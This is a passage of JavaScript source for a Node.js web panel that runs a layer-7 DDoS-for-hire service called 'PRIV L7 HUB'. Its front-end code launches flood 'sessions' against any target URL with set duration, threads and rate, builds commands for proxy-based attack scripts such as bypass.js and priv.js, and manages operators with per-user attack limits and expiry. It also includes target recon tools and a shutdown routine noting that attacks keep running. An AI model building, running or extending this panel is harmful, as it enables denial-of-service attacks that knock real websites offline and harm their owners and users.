'btn.addEventListener("click",async function(e){',
'e.stopPropagation();',
'btn.disabled=true;',
'try{',
'var res=await api("/api/sessions/"+btn.dataset.id,{method:"DELETE"});',
'showToast("Termination requested");',
'if(res&&res.cooldownRemaining!==undefined)cooldownRemaining=res.cooldownRemaining;',
'renderCooldown();',
'loadSessions();',
'}catch(err){showToast(err.message);btn.disabled=false;}',
'});',
'});',
'}',

'function tickLocalSessions(){',
'if(!activeSessionsCache.length)return;',
'var container=$("#sessions");',
'if(!container)return;',
'activeSessionsCache.forEach(function(s){',
'if(s.status==="done")return;',
'if(s.elapsedSeconds<s.duration)s.elapsedSeconds+=1;',
'var serverElapsed=s.serverElapsed||s.elapsedSeconds;',
'if(Math.abs(s.elapsedSeconds-serverElapsed)>2)s.elapsedSeconds=serverElapsed;',
'var item=container.querySelector(\'[data-id="\'+s.id+\'"]\');',
'if(!item)return;',
'var timeChip=item.querySelector(".time-chip");',
'var prog=item.querySelector(".progress");',
'var shown=Math.min(s.elapsedSeconds,s.duration);',
'if(timeChip)timeChip.textContent=shown+"s / "+s.duration+"s";',
'if(prog)prog.style.width=Math.min(100,Math.round((shown/s.duration)*100))+"%";',
'});',
'}',

'async function loadUsers(){',
'try{',
'var data=await api("/api/users");',
'var container=$("#users");',
'if(!container)return;',
'container.innerHTML=data.users.map(function(u){',
'var lim=u.limits||{};',
'var exp=u.expiresAt?("exp:"+String(u.expiresAt).slice(0,10)):"exp:never";',
'return \'<div class="user-row" data-username="\'+escapeHtml(u.username)+\'">\'+',
'\'<div><b>\'+escapeHtml(u.username)+\'</b>\'+',
'\'<div class="meta">\'+escapeHtml(u.role)+\' · dur:\'+limitLabel(lim.maxDuration)+\' · th:\'+limitLabel(lim.maxThreads)+\' · rate:\'+limitLabel(lim.maxRate)+\' · conc:\'+limitLabel(lim.maxConcurrent)+\' · cd:\'+limitLabel(lim.cooldown)+\' · \'+exp+\'</div>\'+',
'\'<div class="edit-limits hide">\'+',
'\'<input type="number" data-k="maxDuration" min="0" value="\'+lim.maxDuration+\'" placeholder="duration">\'+',
'\'<input type="number" data-k="maxThreads" min="0" value="\'+lim.maxThreads+\'" placeholder="threads">\'+',
'\'<input type="number" data-k="maxRate" min="0" value="\'+lim.maxRate+\'" placeholder="rate">\'+',
'\'<input type="number" data-k="maxConcurrent" min="0" value="\'+lim.maxConcurrent+\'" placeholder="conc">\'+',
'\'<input type="number" data-k="cooldown" min="0" value="\'+lim.cooldown+\'" placeholder="cd">\'+',
'\'<input type="text" data-k="expiresAt" value="\'+(u.expiresAt||"")+\'" placeholder="7d / 30d / ISO / blank">\'+',
'\'<select data-k="role">\'+',
'\'<option value="pending"\'+(u.role==="pending"?" selected":"")+\'>pending</option>\'+',
'\'<option value="user"\'+(u.role==="user"?" selected":"")+\'>user</option>\'+',
'\'<option value="admin"\'+(u.role==="admin"?" selected":"")+\'>admin</option>\'+',
'\'</select>\'+',
'\'</div></div>\'+',
'\'<div class="row-actions">\'+',
'\'<button class="edit-btn" type="button">Edit</button>\'+',
'\'<button class="save-btn hide" type="button">Save</button>\'+',
'\'<button class="danger del-btn" type="button">Delete</button>\'+',
'\'</div></div>\';',
'}).join("");',
'container.querySelectorAll(".user-row").forEach(function(row){',
'var username=row.dataset.username;',
'var editBtn=row.querySelector(".edit-btn");',
'var saveBtn=row.querySelector(".save-btn");',
'var delBtn=row.querySelector(".del-btn");',
'var editBox=row.querySelector(".edit-limits");',
'if(editBtn)editBtn.addEventListener("click",function(){',
'editBox.classList.toggle("hide");',
'saveBtn.classList.toggle("hide",editBox.classList.contains("hide"));',
'});',
'if(saveBtn)saveBtn.addEventListener("click",async function(){',
'var payload={};',
'editBox.querySelectorAll("input,select").forEach(function(inp){',
'if(inp.dataset.k==="expiresAt"||inp.dataset.k==="role")payload[inp.dataset.k]=inp.value;',
'else payload[inp.dataset.k]=Number(inp.value);',
'});',
'try{',
'await api("/api/users/"+encodeURIComponent(username),{method:"PUT",body:JSON.stringify(payload)});',
'showToast("Operator updated");loadUsers();',
'}catch(err){showToast(err.message);}',
'});',
'if(delBtn)delBtn.addEventListener("click",async function(){',
'if(!confirm("Delete operator "+username+"?"))return;',
'try{',
'await api("/api/users/"+encodeURIComponent(username),{method:"DELETE"});',
'showToast("Operator deleted");loadUsers();',
'}catch(err){showToast(err.message);}',
'});',
'});',
'}catch(e){}',
'}',

'async function loadBlacklist(){',
'try{',
'var data=await api("/api/blacklist");',
'var container=$("#blacklistList");',
'if(!container)return;',
'var list=data.blacklist||[];',
'if(!list.length){container.innerHTML=\'<div class="empty-state">No blocked targets yet.</div>\';return;}',
'container.innerHTML=list.map(function(p){',
'return \'<div class="bl-item"><span>\'+escapeHtml(p)+\'</span><button data-pattern="\'+escapeHtml(p)+\'" type="button">Remove</button></div>\';',
'}).join("");',
'container.querySelectorAll("button").forEach(function(btn){',
'btn.addEventListener("click",async function(){',
'try{',
'await api("/api/blacklist/"+encodeURIComponent(btn.dataset.pattern),{method:"DELETE"});',
'showToast("Removed");loadBlacklist();',
'}catch(err){showToast(err.message);}',
'});',
'});',
'}catch(e){}',
'}',

'function updateCmdPreview(){',
'var el=$("#cmdPreview");if(!el)return;',
'var sel=$("#methodSelect");',
'var targetEl=$("#targetInput");',
'var dEl=$("#durationInput");',
'var thEl=$("#threadsInput");',
'var rEl=$("#rateInput");',
'var methodId=(sel&&sel.value)||"priv";',
'var t=(targetEl&&targetEl.value.trim())||"<target>";',
'if(t!=="<target>"&&!/^https?:\\/\\//i.test(t))t="https://"+t;',
'var d=(dEl&&dEl.value)||"<duration>";',
'var th=(thEl&&thEl.value)||"<threads>";',
'var r=(rEl&&rEl.value)||"<rate>";',
'var ck=($("#cookiesInput")&&$("#cookiesInput").checked);',
'var hd=($("#headersInput")&&$("#headersInput").checked);',
'var cache=($("#cacheInput")&&$("#cacheInput").checked);',
'if(methodId==="bypass"){',
'var rm=($("#reqMethodSelect")&&$("#reqMethodSelect").value)||"GET";',
'var q=($("#querySelect")&&$("#querySelect").value)||"0";',
'var dl=($("#delayInput")&&$("#delayInput").value)||"0";',
'var lim=($("#limitInput")&&$("#limitInput").checked);',
'var parts=["node bypass.js",rm,t,d,th,r,"proxy.txt"];',
'if(q!=="0")parts.push("--query",q);',
'if(lim)parts.push("--limit","true");',
'if(dl&&Number(dl)>0)parts.push("--delay",dl);',
'el.textContent=parts.join(" ");',
'}else if(methodId==="iran-access"){',
'var parts2=["node priv.js",t,d,"iran.txt",th,r];',
'if(ck)parts2.push("-c");',
'if(hd)parts2.push("-h");',
'el.textContent=parts2.join(" ");',
'}else if(methodId==="c-rush"){',
'var pf=($("#cRushProxySelect")&&$("#cRushProxySelect").value)||"proxy.txt";',
'var parts3=["node l.js",t,d,pf,th,r];',
'if(ck)parts3.push("-c");',
'if(hd)parts3.push("-h");',
'if(cache)parts3.push("-ch","true");',
'el.textContent=parts3.join(" ");',
'}else{',
'var parts4=["node priv.js",t,d,"proxy.txt",th,r];',
'if(ck)parts4.push("-c");',
'if(hd)parts4.push("-h");',
'el.textContent=parts4.join(" ");',
'}',
'}',

'async function startProcess(e){',
'e.preventDefault();',
'var err=$("#launchErr");if(err)err.textContent="";',
'if(!currentUser){showToast("Please sign in to deploy.");setPage("login");return;}',
'if(currentUser.role==="pending"){showToast("Your account is pending approval.");return;}',
'if(cooldownRemaining>0){showToast("Cooldown is set — wait "+cooldownRemaining+" seconds.");return;}',
'var sel=$("#methodSelect");',
'var targetEl=$("#targetInput");',
'var dEl=$("#durationInput");',
'var thEl=$("#threadsInput");',
'var rEl=$("#rateInput");',
'var btn=$("#startBtn");',
'if(!sel||!sel.value){if(err)err.textContent="No method selected.";return;}',
'var target=String(targetEl.value||"").trim();',
'if(!target){if(err)err.textContent="Enter a target URL.";return;}',
'if(!/^https?:\\/\\//i.test(target))target="https://"+target;',
'var dur=Number(dEl.value);',
'if(!dur||dur<1){if(err)err.textContent="Duration must be at least 1.";return;}',
'var thr=Number(thEl.value);',
'if(!thr||thr<1){if(err)err.textContent="Threads must be at least 1.";return;}',
'var rat=Number(rEl.value);',
'if(!rat||rat<1){if(err)err.textContent="Rate must be at least 1.";return;}',
'var payload={',
'method:sel.value,',
'target:target,',
'duration:dur,',
'threads:thr,',
'rate:rat,',
'cookies:!!($("#cookiesInput")&&$("#cookiesInput").checked),',
'headers:!!($("#headersInput")&&$("#headersInput").checked)',
'};',
'if(sel.value==="bypass"){',
'payload.reqmethod=($("#reqMethodSelect")&&$("#reqMethodSelect").value)||"GET";',
'payload.query=($("#querySelect")&&$("#querySelect").value)||"0";',
'payload.delay=Number(($("#delayInput")&&$("#delayInput").value)||0);',
'payload.limit=!!($("#limitInput")&&$("#limitInput").checked);',
'}',
'if(sel.value==="c-rush"){',
'payload.proxyfile=($("#cRushProxySelect")&&$("#cRushProxySelect").value)||"proxy.txt";',
'payload.cache=!!($("#cacheInput")&&$("#cacheInput").checked);',
'}',
'if(btn){btn.disabled=true;var sp=btn.querySelector("span");if(sp)sp.textContent="...";}',
'try{',
'var res=await api("/api/sessions",{',
'method:"POST",',
'body:JSON.stringify(payload)',
'});',
'showToast("Process deployed: "+res.session.method);',
'loadSessions();',
'}catch(ex){',
'if(ex.cooldownRemaining!==undefined){cooldownRemaining=ex.cooldownRemaining;renderCooldown();showToast("Cooldown is set — wait "+cooldownRemaining+" seconds.");}',
'else{if(err)err.textContent=ex.message;showToast("Error: "+ex.message);}',
'}finally{',
'if(btn&&cooldownRemaining===0){btn.disabled=false;var sp2=btn.querySelector("span");if(sp2)sp2.textContent="↗";}',
'}',
'}',

'function setLoginBusy(busy){',
'var btn=$("#loginBtn");if(!btn)return;',
'var label=btn.querySelector(".btn-label");',
'var dots=btn.querySelector(".btn-dots");',
'var arrow=btn.querySelector(".btn-arrow");',
'btn.disabled=!!busy;',
'if(busy){',
'if(label)label.classList.add("hide");',
'if(arrow)arrow.classList.add("hide");',
'if(dots)dots.classList.remove("hide");',
'}else{',
'if(label)label.classList.remove("hide");',
'if(arrow)arrow.classList.remove("hide");',
'if(dots)dots.classList.add("hide");',
'}',
'}',

'async function runPing(){',
'var hostEl=$("#pingHost");',
'var out=$("#pingOutput");',
'var btn=$("#pingRunBtn");',
'var host=(hostEl.value||"").trim();',
'if(!host){out.innerHTML=\'<span class="ping-fail">Enter a host to ping.</span>\';return;}',
'btn.disabled=true;',
'out.innerHTML=\'<div><span class="spinner"></span>Pinging \'+escapeHtml(host)+\' (5 probes) ...</div><div class="scan-bar"></div>\';',
'try{',
'var data=await api("/api/tools/ping",{method:"POST",body:JSON.stringify({host:host})});',
'out.innerHTML="";',
'data.results.forEach(function(r){',
'var line=document.createElement("div");',
'line.className="ping-line";',
'if(r.ok){line.innerHTML=\'Reply from \'+escapeHtml(data.host)+\': time=\'+r.ms+\'ms\';line.classList.add("ping-ok");}',
'else{line.innerHTML=\'Request timed out for \'+escapeHtml(data.host)+\' (\'+escapeHtml(r.error||"fail")+\')\';line.classList.add("ping-fail");}',
'out.appendChild(line);',
'});',
'var s=document.createElement("div");',
's.className="ping-summary";',
's.textContent="Statistics — Sent="+data.count+", Received="+data.received+", Lost="+data.lost+" ("+data.lossPercent+"% loss)"+',
'(data.received>0?(" | min="+data.min+"ms · avg="+data.avg+"ms · max="+data.max+"ms"):"");',
'out.appendChild(s);',
'}catch(e){',
'out.innerHTML=\'<span class="ping-fail">Error: \'+escapeHtml(e.message)+\'</span>\';',
'}finally{',
'btn.disabled=false;',
'}',
'}',

'async function runHttpsCheck(){',
'var hostEl=$("#httpsHost");',
'var out=$("#httpsOutput");',
'var btn=$("#httpsRunBtn");',
'var raw=(hostEl.value||"").trim();',
'if(!raw){out.innerHTML=\'<span class="https-offline">Enter a URL to check.</span>\';return;}',
'var host=raw.replace(/^[a-z]+:\\/\\//i,"").replace(/[/?#].*$/,"").replace(/:\\d+$/,"").replace(/\\.+$/,"").toLowerCase();',
'if(!host){out.innerHTML=\'<span class="https-offline">Enter a valid host.</span>\';return;}',
'btn.disabled=true;',
'out.innerHTML=\'<div><span class="spinner"></span><span class="https-checking">Checking https://\'+escapeHtml(host)+\' ...</span></div><div class="scan-bar"></div>\';',
'try{',
'var data=await api("/api/tools/https",{method:"POST",body:JSON.stringify({host:host})});',
'out.innerHTML="";',
'if(data.ok){',
'out.innerHTML=\'<div class="https-online">✓ Website is ONLINE</div>\'+',
'\'<div class="https-detail">https://\'+escapeHtml(host)+\'</div>\'+',
'\'<div class="https-detail">Status code: <b style="color:var(--text)">\'+data.status+\'</b></div>\'+',
'\'<div class="https-detail">Response time: <b style="color:var(--text)">\'+data.ms+\'ms</b></div>\'+',
'\'<div class="https-detail">Checked at: \'+new Date().toLocaleTimeString()+\'</div>\';',
'}else{',
'out.innerHTML=\'<div class="https-offline">✗ Website is OFFLINE</div>\'+',
'\'<div class="https-detail">https://\'+escapeHtml(host)+\'</div>\'+',
'\'<div class="https-detail">Reason: \'+escapeHtml(data.error||"connection failed")+\'</div>\'+',
'\'<div class="https-detail">Checked at: \'+new Date().toLocaleTimeString()+\'</div>\';',
'}',
'}catch(e){',
'out.innerHTML=\'<span class="https-offline">Error: \'+escapeHtml(e.message)+\'</span>\';',
'}finally{',
'btn.disabled=false;',
'}',
'}',

'async function runAsnLookup(){',
'var raw=($("#asnHost").value||"").trim();',
'var out=$("#asnOutput");',
'var btn=$("#asnRunBtn");',
'if(!raw){out.innerHTML=\'<span class="https-offline">Enter a host.</span>\';return;}',
'var host=raw.replace(/^[a-z]+:\\/\\//i,"").replace(/[/?#].*$/,"").replace(/:\\d+$/,"").replace(/\\.+$/,"").toLowerCase();',
'if(!host){out.innerHTML=\'<span class="https-offline">Invalid host.</span>\';return;}',
'btn.disabled=true;',
'out.innerHTML=\'<div><span class="spinner"></span><span class="https-checking">Looking up \'+escapeHtml(host)+\' ...</span></div><div class="scan-bar"></div>\';',
'try{',
'var d=await api("/api/tools/asn",{method:"POST",body:JSON.stringify({host:host})});',
'var flags=[];',
'if(d.flags.hosting)flags.push("hosting");',
'if(d.flags.proxy)flags.push("proxy/vpn");',
'if(d.flags.mobile)flags.push("mobile");',
'out.innerHTML=',
'\'<div class="https-online">✓ \'+escapeHtml(d.host)+\'</div>\'+',
'\'<div class="https-detail">IP: <b style="color:var(--text)">\'+escapeHtml(d.ip)+\'</b></div>\'+',
'\'<div class="https-detail">ASN: <b style="color:var(--accent-cyan)">\'+escapeHtml(d.asn||"—")+\'</b> · \'+escapeHtml(d.asName||"—")+\'</div>\'+',
'\'<div class="https-detail">Org: <b style="color:var(--text)">\'+escapeHtml(d.org||d.isp||"—")+\'</b></div>\'+',
'\'<div class="https-detail">ISP: \'+escapeHtml(d.isp||"—")+\'</div>\'+',
'\'<div class="https-detail">Country: \'+escapeHtml(d.country||"—")+\' (\'+escapeHtml(d.countryCode||"—")+\')</div>\'+',
'\'<div class="https-detail">Region: \'+escapeHtml(d.region||"—")+\' · City: \'+escapeHtml(d.city||"—")+\'</div>\'+',
'\'<div class="https-detail">Timezone: \'+escapeHtml(d.timezone||"—")+\'</div>\'+',
'\'<div class="https-detail">Coords: \'+d.lat+\', \'+d.lon+\'</div>\'+',
'(d.reverse?\'<div class="https-detail">Reverse: \'+escapeHtml(d.reverse)+\'</div>\':\'\')+',
'(flags.length?\'<div class="https-detail">Flags: \'+flags.join(", ")+\'</div>\':\'\');',
'}catch(e){',
'out.innerHTML=\'<span class="https-offline">Error: \'+escapeHtml(e.message)+\'</span>\';',
'}finally{',
'btn.disabled=false;',
'}',
'}',

'function bindEvents(){',
'var lf=$("#loginForm");',
'if(lf)lf.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var err=$("#loginErr");if(err)err.textContent="";',
'var uEl=e.target.querySelector(\'[name="username"]\');',
'var pEl=e.target.querySelector(\'[name="password"]\');',
'var cEl=e.target.querySelector(\'[name="captchaAnswer"]\');',
'setLoginBusy(true);',
'try{',
'var data=await api("/api/login",{method:"POST",body:JSON.stringify({username:uEl.value,password:pEl.value,captchaAnswer:Number(cEl.value)})});',
'currentUser=data.user;',
'updateAuthUI();updateRoleDisplay();applyUserLimits();',
'showToast("Signed in successfully.");',
'e.target.reset();',
'setPage("hub");',
'loadMethods();loadSessions();',
'}catch(ex){if(err)err.textContent=ex.message;loadCaptcha("login");}',
'finally{setLoginBusy(false);}',
'});',

'var rf=$("#registerForm");',
'if(rf)rf.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var err=$("#registerErr");if(err)err.textContent="";',
'var fd=new FormData(e.target);',
'var btn=$("#registerBtn");if(btn)btn.disabled=true;',
'try{',
'var data=await api("/api/register",{method:"POST",body:JSON.stringify({',
'username:fd.get("username"),',
'password:fd.get("password"),',
'captchaAnswer:Number(fd.get("captchaAnswer"))',
'})});',
'currentUser=data.user;',
'updateAuthUI();updateRoleDisplay();applyUserLimits();',
'showToast("Account created. Awaiting admin approval.");',
'e.target.reset();',
'setPage("hub");',
'loadMethods();loadSessions();',
'}catch(ex){',
'if(err)err.textContent=ex.message;',
'loadCaptcha("register");',
'}finally{if(btn)btn.disabled=false;}',
'});',

'var cr=$("#captchaRefresh");',
'if(cr)cr.addEventListener("click",function(){loadCaptcha("register");});',
'var lcr=$("#loginCaptchaRefresh");',
'if(lcr)lcr.addEventListener("click",function(){loadCaptcha("login");});',
'var tl=$("#toLoginLink");',
'if(tl)tl.addEventListener("click",function(e){e.preventDefault();setPage("login");});',
'var tr=$("#toRegisterLink");',
'tr&&tr.addEventListener("click",function(e){e.preventDefault();setPage("register");});',

'var lo=$("#navLogout");',
'if(lo)lo.addEventListener("click",async function(){',
'try{await api("/api/logout",{method:"POST"});}catch(e){}',
'currentUser=null;',
'updateAuthUI();updateRoleDisplay();',
'showToast("Signed out.");',
'setPage("hub");',
'loadMethods();loadSessions();',
'});',

'var mn=$("#menu");',
'if(mn)mn.addEventListener("click",function(){',
'if(sidebar.classList.contains("open"))closeSidebar();else openSidebar();',
'});',
'if(sidebarBackdrop)sidebarBackdrop.addEventListener("click",closeSidebar);',
'$$("#sidebar button[data-page]").forEach(function(btn){',
'btn.addEventListener("click",function(){setPage(btn.dataset.page);});',
'});',

'var ms=$("#methodSelect");',
'if(ms)ms.addEventListener("change",function(){updateMethodFields();updateCmdPreview();});',
'var launchForm=$("#launch");',
'if(launchForm){',
'launchForm.addEventListener("input",updateCmdPreview);',
'launchForm.addEventListener("change",updateCmdPreview);',
'launchForm.addEventListener("submit",startProcess);',
'}',
'var rfr=$("#refresh");',
'if(rfr)rfr.addEventListener("click",loadSessions);',

'var ac=$("#account");',
'if(ac)ac.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#accountMsg");if(msg){msg.className="";msg.textContent="";}',
'var fd=new FormData(e.target);',
'try{',
'var data=await api("/api/account",{method:"POST",body:JSON.stringify({',
'currentPassword:fd.get("currentPassword"),',
'newUsername:fd.get("newUsername")||undefined,',
'newPassword:fd.get("newPassword")||undefined',
'})});',
'currentUser=data.user;updateRoleDisplay();applyUserLimits();',
'if(msg){msg.className="ok";msg.textContent=data.notification||"Security settings updated successfully.";}',
'showToast(data.notification||"Security settings updated successfully.");',
'e.target.reset();',
'}catch(ex){',
'if(msg){msg.className="err";msg.textContent=ex.message;}',
'showToast("Error: "+ex.message);',
'}',
'});',

'var cu=$("#createUser");',
'if(cu)cu.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#userMsg");if(msg)msg.textContent="";',
'var fd=new FormData(e.target);',
'try{',
'await api("/api/users",{method:"POST",body:JSON.stringify({',
'username:fd.get("username"),',
'password:fd.get("password"),',
'maxDuration:Number(fd.get("maxDuration")||0),',
'maxThreads:Number(fd.get("maxThreads")||0),',
'maxRate:Number(fd.get("maxRate")||0),',
'maxConcurrent:Number(fd.get("maxConcurrent")||0),',
'cooldown:Number(fd.get("cooldown")||0),',
'expiresAt:fd.get("expiresAt")||null,',
'role:fd.get("role")||"user"',
'})});',
'if(msg){msg.className="ok";msg.textContent="Operator created.";}',
'showToast("Operator created");',
'e.target.reset();loadUsers();',
'}catch(ex){if(msg){msg.className="err";msg.textContent=ex.message;}}',
'});',

'var ab=$("#addBlacklist");',
'if(ab)ab.addEventListener("submit",async function(e){',
'e.preventDefault();',
'var msg=$("#blacklistMsg");if(msg)msg.textContent="";',
'var fd=new FormData(e.target);',
'try{',
'await api("/api/blacklist",{method:"POST",body:JSON.stringify({pattern:fd.get("pattern")})});',
'if(msg){msg.className="ok";msg.textContent="Added.";}',
'showToast("Blocklist updated");',
'e.target.reset();loadBlacklist();',
'}catch(ex){if(msg){msg.className="err";msg.textContent=ex.message;}}',
'});',

'var pb=$("#toolPingBtn");',
'if(pb)pb.addEventListener("click",function(){',
'$("#toolPing").classList.remove("hide");',
'$("#toolHttps").classList.add("hide");',
'$("#toolAsn").classList.add("hide");',
'});',
'var hb=$("#toolHttpsBtn");',
'if(hb)hb.addEventListener("click",function(){',
'$("#toolHttps").classList.remove("hide");',
'$("#toolPing").classList.add("hide");',
'$("#toolAsn").classList.add("hide");',
'});',
'var ab2=$("#toolAsnBtn");',
'if(ab2)ab2.addEventListener("click",function(){',
'$("#toolAsn").classList.remove("hide");',
'$("#toolPing").classList.add("hide");',
'$("#toolHttps").classList.add("hide");',
'});',
'var pr=$("#pingRunBtn");',
'if(pr)pr.addEventListener("click",runPing);',
'var hr=$("#httpsRunBtn");',
'if(hr)hr.addEventListener("click",runHttpsCheck);',
'var ar=$("#asnRunBtn");',
'if(ar)ar.addEventListener("click",runAsnLookup);',
'}',

'async function bootApp(){',
'bindEvents();',
'updateMethodFields();',
'updateCmdPreview();',
'renderCooldown();',
'startCooldownTicker();',
'await checkAuth();',
'setPage("hub");',
'sessionPoll=setInterval(loadSessions,3000);',
'localTimerInterval=setInterval(tickLocalSessions,1000);',
'}',
'bootApp();',
'})();'
].join('\n');

app.get('/', function (_req, res) { res.type('html').send(HTML); });
app.get('/ui.js', function (_req, res) { res.type('application/javascript').send(UI_JS); });
app.get('/ui.css', function (_req, res) { res.type('text/css').send(UI_CSS); });

app.use(function (err, _req, res, _next) {
  console.error(err);
  res.status(500).json({ error: 'Internal server error.' });
});

/* ---------- START ---------- */
reattachSessions();

const server = app.listen(CONFIG.port, CONFIG.host, function () {
  console.log('');
  console.log('  PRIV L7 HUB    ->  http://' + CONFIG.host + ':' + CONFIG.port);
  console.log('  Contact        ->  https://t.me/privflood');
  console.log('  Script folder  ->  ' + SCRIPT_DIR);
  const methods = getMethods();
  console.log('  Methods        ->  ' + (methods.length ? methods.map(function (m) { return m.name; }).join(', ') : '(none found)'));
  const proxyPath = path.join(SCRIPT_DIR, 'proxy.txt');
  const iranPath = path.join(SCRIPT_DIR, 'iran.txt');
  console.log('  Proxy file     ->  proxy.txt' + (fs.existsSync(proxyPath) ? ' (found)' : ' (MISSING)'));
  console.log('  Iran file      ->  iran.txt' + (fs.existsSync(iranPath) ? ' (found)' : ' (MISSING)'));
  console.log('  Cookie secure  ->  ' + (CONFIG.cookieSecure ? 'yes (SameSite=None)' : 'no (SameSite=Lax)'));
  console.log('  Min password   ->  ' + CONFIG.minPasswordLength + ' characters');
  console.log('  Admin          ->  unlimited duration / threads / rate / concurrent / no cooldown');
  console.log('  Users          ->  per-user limits (0 = unlimited), cooldown, expiry');
  console.log('  Default CD     ->  ' + CONFIG.defaultCooldown + 's');
  console.log('  Hub domain     ->  ' + (CONFIG.hubDomain || '(unknown)'));
  console.log('  Telegram bot   ->  managed by privbot.service (bot.js)');
  console.log('');
});

function shutdown(sig) {
  console.log('\n[hub] ' + sig + ' received, shutting down (attacks keep running)...');
  for (const entry of sessions.values()) {
    try {
      const s = entry;
      if (s.child && s.child.stdout && s.child.stdout.removeAllListeners) s.child.stdout.removeAllListeners('data');
      if (s.child && s.child.stderr && s.child.stderr.removeAllListeners) s.child.stderr.removeAllListeners('data');
      if (s.child && s.child.unref) s.child.unref();
    } catch (e) {}
  }
  try { _auditStream.end(); } catch (e) {}
  server.close(function () { process.exit(0); });
  setTimeout(function () { process.exit(0); }, 2000).unref();
}
process.on('SIGINT', function () { shutdown('SIGINT'); });
process.on('SIGTERM', function () { shutdown('SIGTERM'); });
